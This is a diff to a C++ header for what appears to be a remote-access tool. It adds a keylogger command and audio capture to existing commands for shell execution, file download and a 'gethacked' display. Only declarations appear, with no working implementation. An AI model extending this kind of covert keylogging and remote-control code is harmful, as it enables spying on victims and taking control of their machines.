@@ -7,8 +7,10 @@
 #include <optional>
 #include <thread>
 
+#include <rigtorp/SPSCQueue.h>
+#include <portaudio.h>
+#include <opus.h>
 #include "command.h"
-#include "rigtorp/SPSCQueue.h"
 
 class Controller;
 
@@ -28,6 +30,11 @@ enum class ShowoffCommandEnum {
     gethacked, hi
 };
 
+enum class KeylogCommandEnum {
+    start, stop
+};
+
+
 // navigation.cpp
 COMMAND(3, Navigation, NavigationCommandEnum, std::string);
 // discord.cpp
@@ -43,8 +50,10 @@ public:
     ~AudioCommand();
     int execute(Controller&, AudioCommandEnum) override;
 private:
-    rigtorp::SPSCQueue<uint8_t> audioQueue;
+    rigtorp::SPSCQueue<int16_t> audioQueue;
+    PaStream* stream = nullptr;
     std::thread worker;
+    bool enabled = false;
 };
 // files.cpp
 COMMAND(8, DownloadFile, std::string);
@@ -57,5 +66,7 @@ COMMAND(11, Dialog, uint32_t, std::string, std::string);
 COMMAND(12, Showoff, ShowoffCommandEnum);
 // shellexec.cpp
 COMMAND(13, ShellExecute, std::optional<std::string>, std::optional<std::string>, std::optional<std::string>, std::optional<std::string>, std::optional<int>);
+// keylog.cpp
+COMMAND(14, Keylog, KeylogCommandEnum);
 
 #endif
